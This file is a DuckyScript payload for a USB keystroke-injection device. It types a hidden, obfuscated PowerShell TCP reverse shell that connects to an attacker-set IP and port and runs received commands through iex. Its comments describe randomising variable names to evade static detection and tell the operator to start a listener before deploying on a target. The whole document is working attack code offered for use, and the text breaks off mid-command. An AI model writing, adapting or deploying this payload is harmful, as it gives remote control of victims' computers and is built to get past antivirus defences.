
REM Target: Windows / Linux(?) (Not tested with Powershell on Linux)
REM Requirements: DuckyScript 3.0, PayloadStudio v. 1.3.0 minimum

REM Description:
REM TCP Reverse shell executed hidden in the background, 
REM the CAPSLOCK light at the end will indicate that the payload was executed.
REM Because of randomisation static detection will be impeded
REM DON'T FORGET TO START LISTENER BEFORE DEPLOYING ON TARGET

REM REQUIRED: Define the attackers IP & Port
DEFINE ADDRESS '0.0.0.0'
DEFINE PORT 4444

REM Extension DETECT_READY by Korben for best and fastest deployment
EXTENSION DETECT_READY
REM VERSION 1.0
REM USAGE:
REM Extension runs inline (here)
REM Place at beginning of payload (besides ATTACKMODE) to act as dynamic
REM boot delay
REM TARGETS:
REM Any system that reflects CAPSLOCK will detect minimum required delay
REM Any system that does not reflect CAPSLOCK will hit the max delay of 3000ms
REM CONFIGURATION:
DEFINE RESPONSE_DELAY 25
DEFINE ITERATION_LIMIT 120

REM Variables for pseudo random variables
VAR 0var_gibberish=6RANDOM_NUMBER_KEYCODE
VAR 1var_gibberish2=6RANDOM_LETTER_KEYCODE
VAR 2var_gibberish3=6RANDOM_LOWER_LETTER_KEYCODE
VAR 3var_gibberish4=6RANDOM_LETTER_KEYCODE
VAR 4var_gibb3rish=6RANDOM_NUMBER_KEYCODE
VAR 5var_duckID=6RANDOM_UPPER_LETTER_KEYCODE
VAR 6var_duckID2=6RANDOM_NUMBER_KEYCODE
VAR 7var_duckID3=6RANDOM_NUMBER_KEYCODE

DELAY 1500
GUI r
DELAY 500
STRINGLN powershell -NoP -NonI -w h
DELAY 500
STRING $
INJECT 0var_gibberish
INJECT 1var_gibberish2
INJECT 2var_gibberish3
INJECT 3var_gibberish4
STRING =[TyPE]('tExT'+'.enCOD'+'InG');$
INJECT 4var_gibb3rish
REM Address and Port of the listening machine
STRING =.('New'+'-Obj'+'ect') System.Net.Sockets.TCPClient( ADDRESS , PORT );$
INJECT 3var_gibberish4
STRING =$
INJECT 4var_gibb3rish
STRING .GetStream();[byte[]]$b=0..65535|&('%'){0};while(($
INJECT 3var_gibberish4
INJECT 2var_gibberish3
INJECT 0var_gibberish
INJECT 7var_duckID3
STRING =$
INJECT 3var_gibberish4
STRING .Read($b,0,$b.Length))-ne 0){;$d=(&('New'+'-Ob'+'ject') -TypeName System.Text.ASCIIEncoding).GetString($b,0,$
INJECT 3var_gibberish4
INJECT 2var_gibberish3
INJECT 0var_gibberish
INJECT 7var_duckID3
STRING );$X=(&('ie'+'x') $d 2>&1
